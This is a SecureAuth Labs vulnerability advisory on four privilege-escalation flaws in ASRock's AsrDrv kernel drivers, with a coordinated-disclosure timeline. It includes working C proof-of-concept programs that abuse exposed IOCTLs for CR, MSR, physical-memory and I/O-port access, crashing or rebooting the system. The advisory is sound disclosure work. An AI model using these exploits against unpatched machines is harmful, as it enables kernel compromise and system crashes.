@@ -1,0 +1,503 @@
+SecureAuth - SecureAuth Labs Advisory
+http://www.secureauth.com/
+
+ASRock Drivers Elevation of Privilege Vulnerabilities
+
+1. *Advisory Information*
+
+Title: ASRock Drivers Elevation of Privilege Vulnerabilities
+Advisory ID: CORE-2018-0005
+Advisory URL: https://www.secureauth.com/labs/advisories/asrock-drivers-elevation-privilege-vulnerabilities
+Date published: 2018-10-25
+Date of last update: 2018-10-25
+Vendors contacted: ASRock
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: Exposed IOCTL with Insufficient Access Control [CWE-782], Exposed
+IOCTL with Insufficient Access Control [CWE-782], Exposed IOCTL with
+Insufficient Access Control [CWE-782], Exposed IOCTL with Insufficient
+Access Control [CWE-782]
+Impact: Code execution
+Remotely Exploitable: No
+Locally Exploitable: Yes
+CVE Name: CVE-2018-10709, CVE-2018-10710, CVE-2018-10711, CVE-2018-10712
+
+3. *Vulnerability Description*
+
+ASRock's website states that [1]:
+
+ASRock Inc. is established in 2002, specialized in the field of
+motherboards. With the 3C design concept, Creativity, Consideration,
+Cost-effectiveness, the company explores the limit of motherboards
+manufacturing while paying attention on the eco issue at the same
+time, developing products with the consideration of eco-friendly
+concept. ASRock has been growing fast and become world third largest
+motherboard brand with headquarter in Taipei, Taiwan and branches in
+Europe and the USA.
+
+ASRock offers several utilities designed to give the user with an ASRock
+motherboard more control over certain settings and functions.
+These utilities include various features like the RGB LED control,
+hardware monitor, fan controls, and overclocking/voltage options.
+
+Multiple vulnerabilities were found in AsrDrv101.sys and AsrDrv102.sys
+low level drivers, installed by ASRock RGBLED and other ASRock branded
+utilities, which could allow a local attacker to elevate privileges.
+
+4. *Vulnerable Packages*
+
+   . ASRock RGBLED before v1.0.35.1
+   . A-Tuning before v3.0.210
+   . F-Stream before v3.0.210
+   . RestartToUEFI before v1.0.6.2
+
+5. *Vendor Information, Solutions and Workarounds*
+
+ASRock published the following fixed applications for each of its
+motherboards models:
+
+   . ASRock RGBLED v1.0.36
+   . A-Tuning v3.0.216
+   . F-Stream v3.0.216
+   . RestartToUEFI v1.0.7
+
+Downloads are available on the ASRock website.
+
+6. *Credits*
+
+These vulnerabilities were discovered and researched by Diego Juarez.
+The publication of this advisory was coordinated by Leandro Cuozzo
+from SecureAuth Advisories Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+ASRock's RBGLED, A-Tuning, F-Stream, RestartToUEFI, and possibly others,
+use a low level driver to program and query the status on embedded ICs
+on their hardware. Fan curves, clock frequencies, LED colors, thermal
+performance, and other user customizable properties and monitoring
+functionality are exposed to applications through this low level kernel
+driver.
+
+The main subjects of this advisory are the device drivers
+installed/loaded by these utilities (AsrDrv101.sys and ArsDrv102.sys).
+>From now on addressed as "AsrDrv". Default installation allows
+non-privileged user processes (even running at LOW INTEGRITY) to get a
+HANDLE and issue IOCTL codes to the driver.
+
+The following sections describe the problems found.
+
+7.1. *CR register access*
+
+[CVE-2018-10709]
+
+AsrDrv exposes functionality to read and write CR register values. This
+could be leveraged in a number of ways to ultimately run code with
+elevated privileges.
+
+/-----
+// Asrock RGBLED PoC demonstrating non-privileged access to CR registers
+
+#include <windows.h>
+#include <stdio.h>
+
+#define IOCTL_ASROCK_READCR 0x22286C
+#define IOCTL_ASROCK_WRITECR 0x222870
+
+HANDLE ghDriver = 0;
+
+#pragma pack (push,1)
+
+typedef struct _ASROCK_CR_STRUCT {
+    ULONG64 reg;
+    ULONG64 value;
+} ASROCK_CR_STRUCT;
+
+#pragma pack(pop)
+
+#define IOCTLMACRO(iocontrolcode, size) \
+    ULONG64 outbuffer[2] = { 0 };    \
+    DWORD returned = 0;    \
+    DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);    \
+    return outbuffer[1];    \
+
+ULONG64 ASROCK_ReadCR(DWORD reg)
+{
+    ASROCK_CR_STRUCT  inbuffer = { 3, 0};
+    IOCTLMACRO(IOCTL_ASROCK_READCR, 10)
+}
+
+ULONG64 ASROCK_WriteCR(DWORD reg, ULONG64 value)
+{
+    ASROCK_CR_STRUCT  inbuffer = { reg, value};
+    IOCTLMACRO(IOCTL_ASROCK_WRITECR, 10)
+}
+
+BOOL InitDriver()
+{
+    char szDeviceName[] = "\\\\.\\AsrDrv101";
+    ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (ghDriver == INVALID_HANDLE_VALUE) {
+        printf("Cannot get handle to driver object \'%s\'- GetLastError:%d\n", szDeviceName, GetLastError());
+        return FALSE;
+    }
+    return TRUE;
+}
+
+int main(int argc, char* argv[])
+{
+    printf("Asrock RGBLED PoC (CR access) - pnx!/CORE\n");
+
+    if (!InitDriver()) {
+        printf("InitDriver failed! - aborting...\n");
+        exit(0);
+    }
+
+    ULONG64 a = ASROCK_ReadCR(3);
+    printf("CR3 (PageDir): %llx\n", a);
+    printf("press ENTER for instant system CRASH\n");
+    getchar();
+
+    a = ASROCK_WriteCR(3, 0xffff1111ffff2222);
+
+    CloseHandle(ghDriver);
+}
+-----/
+
+7.2. *Arbitrary physical memory read/write*
+
+[CVE-2018-10710]
+
+AsrDrv's IOCTL code 0x22280C exposes a functionality to read and write
+arbitrary physical memory, this could be leveraged by a local attacker
+to elevate privileges.
+
+Proof of Concept:
+
+/-----
+// Asrock RGBLED PoC (arbitrary physical memory write)
+// This PoC demonstrates arbitrary write to physical memory.
+
+#include <windows.h>
+#include <stdio.h>
+
+#define IOCTL_ASROCK_WRITEPH 0x22280C
+
+HANDLE ghDriver = 0;
+
+#pragma pack (push,1)
+
+typedef struct _ASROCK_PH_STRUCT {
+    ULONG64 destPhysical;
+    DWORD size;
+    DWORD unk0;
+    ULONG64 src;
+} ASROCK_PH_STRUCT;
+
+#pragma pack(pop)
+
+BOOL ASROCK_ph_memcpy(ULONG64 dest, ULONG64 src, DWORD size)
+{
+    ASROCK_PH_STRUCT mystructIn = { dest, size, 0, src};
+
+    BYTE outbuffer[0x30] = { 0 };
+
+    DWORD returned = 0;
+    DeviceIoControl(ghDriver, IOCTL_ASROCK_WRITEPH, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);
+    if (returned) {
+        return TRUE;
+    }
+    return FALSE;
+}
+
+BOOL InitDriver()
+{
+    char szDeviceName[] = "\\\\.\\AsrDrv101";
+    ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (ghDriver == INVALID_HANDLE_VALUE) {
+        printf("Cannot get handle to driver \'%s\'- GetLastError:%d\n", szDeviceName, GetLastError());
+        return FALSE;
+    }
+    return TRUE;
+}
+
+int main(int argc, char * argv[])
+{
+    printf("Asrock RGBLED PoC (arbitrary physical memory write) - pnx!/CORE\n");
+    if (!InitDriver()) {
+        exit(0);
+    }
+
+    printf("press ENTER for SYSTEM CRASH\n");
+    getchar();
+    ULONG64 data = 0xFFFF1111FFFF2222;
+    for (unsigned int i = 0; i < 0xffffffff; i += 0x1000) {
+        printf(".");
+        ASROCK_ph_memcpy(i, (ULONG64)&data, 8);
+    }
+
+    CloseHandle(ghDriver);
+    return 0;
+}
+-----/
+
+7.3. *MSR Register access*
+
+[CVE-2018-10711]
+
+AsrDrv exposes functionality to read and write Machine Specific
+Registers (MSRs). This could be leveraged to execute arbitrary ring-0
+code.
+
+Proof of Concept:
+
+/-----
+// Asrock RGBLED PoC demonstrating non-privileged access to MSR registers
+
+// This PoC demonstrates non privileged MSR access by reading
+// IA32_LSTAR value (leaks a kernel function pointer bypassing KASLR)
+// and then writing garbage to it (instant BSOD!)
+
+#include <windows.h>
+#include <stdio.h>
+
+#define IOCTL_ASROCK_RDMSR 0x222848
+#define IOCTL_ASROCK_WRMSR 0x22284C
+
+HANDLE ghDriver = 0;
+
+#pragma pack (push,1)
+
+typedef struct _ASROCK_MSRIO_STRUCT {
+    ULONG64 valLO;            //
+    DWORD reg;            //
+    ULONG64 valHI;        //
+} ASROCK_MSRIO_STRUCT;
+
+#pragma pack(pop)
+
+#define IOCTLMACRO(iocontrolcode, size) \
+    ASROCK_MSRIO_STRUCT outbuffer = { 0 };\
+    DWORD returned = 0;    \
+    DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)&outbuffer, sizeof(outbuffer), &returned, NULL);    \
+    return (outbuffer.valHI<<0x20 | outbuffer.valLO);    \
+
+ULONG64 GIO_RDMSR(DWORD reg)
+{
+    ASROCK_MSRIO_STRUCT inbuffer = { 0, reg };
+    IOCTLMACRO(IOCTL_ASROCK_RDMSR, 20)
+}
+
+ULONG64 GIO_WRMSR(DWORD reg, ULONG64 value)
+{
+    ASROCK_MSRIO_STRUCT inbuffer = { value & 0xffffffff, reg, (value & 0xffffffff00000000)>>0x20 };
+    IOCTLMACRO(IOCTL_ASROCK_WRMSR, 20)
+}
+
+BOOL InitDriver()
+{
+    char szDeviceName[] = "\\\\.\\AsrDrv101";
+    ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (ghDriver == INVALID_HANDLE_VALUE) {
+        printf("Cannot get handle to driver object \'%s\'- GetLastError:%d\n", szDeviceName, GetLastError());
+        return FALSE;
+    }
+    return TRUE;
+}
+
+int main(int argc, char * argv[])
+{
+    printf("Asrock RGBLED PoC (MSR access) - pnx!/CORE\n");
+
+    if (!InitDriver()) {
+        printf("InitDriver failed! - aborting...\n");
+        exit(0);
+    }
+
+    ULONG64 a = GIO_RDMSR(0xC0000082);
+    printf("IA322_LSTAR: %llx (nt!KiSystemCall64)\n", a);
+    printf("press ENTER for instant BSOD\n");
+    getchar();
+
+    a = GIO_WRMSR(0xC0000082, 0xffff1111ffff2222);
+    return (int)CloseHandle(ghDriver);
+}
+-----/
+
+7.4. *Port mapped I/O access*
+
+[CVE-2018-10712]
+
+AsrDrv exposes functionality to read/write data from/to IO ports. This
+could be leveraged in a number of ways to ultimately run code with
+elevated privileges.
+
+/-----
+// Asrock RGBLED PoC demonstrating non-privileged access to IO ports
+
+#include <windows.h>
+#include <stdio.h>
+
+#define IOCTL_ASROCK_PORTREADB 0x222810
+#define IOCTL_ASROCK_PORTWRITEB 0x222814
+
+HANDLE ghDriver = 0;
+
+#pragma pack (push,1)
+
+typedef struct _ASROCK_CR_STRUCT {
+    DWORD port;
+    ULONG64 value;
+} ASROCK_CR_STRUCT;
+
+#pragma pack(pop)
+
+#define IOCTLMACRO(iocontrolcode, size) \
+    BYTE outbuffer[0x10] = { 0 };    \
+    DWORD returned = 0;    \
+    DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);    \
+    return outbuffer[1];    \
+
+BYTE ASROCK_ReadPortB(DWORD port)
+{
+    ASROCK_CR_STRUCT  inbuffer = { port, 0};
+    IOCTLMACRO(IOCTL_ASROCK_PORTREADB, 10)
+}
+
+BYTE ASROCK_WritePortB(DWORD port, ULONG64 value)
+{
+    ASROCK_CR_STRUCT  inbuffer = { port, value};
+    IOCTLMACRO(IOCTL_ASROCK_PORTWRITEB, 10)
+}
+
+void Reboot()
+{
+    BYTE cf9 = ASROCK_ReadPortB(0xcf9) & ~0x6;
+    ASROCK_WritePortB(0xcf9, cf9 | 2);
+    Sleep(50);
+    ASROCK_WritePortB(0xcf9, cf9 | 0xe);
+    Sleep(50);
+}
+
+BOOL InitDriver()
+{
+    char szDeviceName[] = "\\\\.\\AsrDrv101";
+    ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    if (ghDriver == INVALID_HANDLE_VALUE) {
+        printf("Cannot get handle to driver object \'%s\'- GetLastError:%d\n", szDeviceName, GetLastError());
+        return FALSE;
+    }
+    return TRUE;
+}
+
+int main(int argc, char * argv[])
+{
+    printf("Asrock RGBLED PoC (PMIO access) - pnx!/CORE\n");
+
+    if (!InitDriver()) {
+        printf("InitDriver failed! - aborting...\n");
+        exit(0);
+    }
+
+    Reboot();
+    return (int)CloseHandle(ghDriver);
+}
+-----/
+
+8. *Report Timeline*
+2018-03-12: SecureAuth sent an initial notification to ASRock America
+Support.
+2018-03-13: ASRock confirmed the receipt and requested additional
+information in order to send it to its HQ.
+2018-03-13: SecureAuth answered saying that a draft advisory has been
+written, including a technical description, and requested for PGP keys
+in order to send it encrypted.
+2018-03-14: ASRock answered asking for the advisory in clear text.
+2018-03-14: SecureAuth sent the draft advisory to ASRock in clear text
+form.
+2018-03-14: ASRock confirmed the receipt and informed they would submit
+it to the HQ for validation.
+2018-03-23: SecureAuth requested a status update on the case.
+2018-03-23: ASRock answered saying they didn't have a reply from HQ.
+2018-03-26: ASRock notified SecureAuth they were still checking the
+reported vulnerabilities and requested additional time.
+2018-03-27: SecureAuth thanked the status update and informed ASRock
+that would be in contact the following week.
+2018-03-28: ASRock informed SecureAuth they checked the reported
+vulnerabilities and they would have a preliminary schedule for the fix
+at the end of April.
+2018-03-28: SecureAuth thanked ASRock's reply.
+2018-04-20: ASRock notified that the driver was modified and sent to
+SecureAuth the fixed applications and requested for a feedback.
+2018-04-23: SecureAuth acknowledged the reception of the fixed
+applications.
+2018-05-09: SecureAuth tested the modified driver and verified that the
+issues detailed in the proofs of concept were solved.
+For that reason, SecureAuth propose release date to be May 23rd.
+2018-05-09: ASRock thanked SecureAuth's update and forwarded the
+proposal to its HQ for a confirmation.
+2018-05-15: ASRock notified SecureAuth that they were going to deploy
+the new driver architecture into each ASRock utility.
+For the whole project, ASRock estimated to finish by the end of June.
+2018-05-15: SecureAuth thanked ASRock's update and asked if ASRock had
+planned to release a security note.
+2018-05-23: ASRock informed that each utility would include a release
+note with a security description.
+2018-06-15: SecureAuth requested ASRock a status update about its
+timescale.
+2018-06-09: ASRock forwarded the request to its HQ.
+2018-06-19: ASRock informed that they had started to upload the fixed
+drivers for one of the supported motherboard series
+and they were going to continue uploading the drivers for other models.
+2018-07-11: SecureAuth requested ASRock a status update.
+2018-07-11: ASRock replied saying they were still working on the upload
+process.
+2018-08-06: SecureAuth requested ASRock a new status update.
+2018-08-16: ASRock notified SecureAuth they had finished with the update
+process.
+2018-10-17: SecureAuth set October 25th as the publication date.
+2018-10-25: Advisory CORE-2018-0005 published.
+
+9. *References*
+
+[1] http://www.asrock.com/
+
+10. *About SecureAuth Labs*
+
+SecureAuth Labs, the research arm of SecureAuth Corporation, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct research in several important areas of
+computer security, including identity-related attacks, system
+vulnerabilities and cyber-attack planning. Research includes problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies. We regularly publish security
+advisories, primary research, technical publications, research blogs,
+project information, and shared software tools for public use at
+http://www.secureauth.com.
+
+11. *About SecureAuth*
+
+SecureAuth is leveraged by leading companies, their employees, their
+customers and their partners to eliminate identity-related breaches.
+As a leader in access management, identity governance, and penetration
+testing, SecureAuth is powering an identity security revolution by
+enabling people and devices to intelligently and adaptively access
+systems and data, while effectively keeping bad actors from doing harm.
+By ensuring the continuous assessment of risk and enablement of trust,
+SecureAuth's highly flexible Identity Security Automation (ISA) platform
+makes it easier for organizations to prevent the misuse of credentials
+and exponentially reduce the enterprise threat surface. To learn more,
+visit www.secureauth.com<http://www.secureauth.com>, call (949) 777-6959, or email us at
+info@secureauth.com<mailto:info@secureauth.com>
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2018 SecureAuth, and are
+licensed under a Creative Commons Attribution Non-Commercial Share-Alike
+3.0 (United States) License:
+http://creativecommons.org/licenses/by-nc-sa/3.0/us/
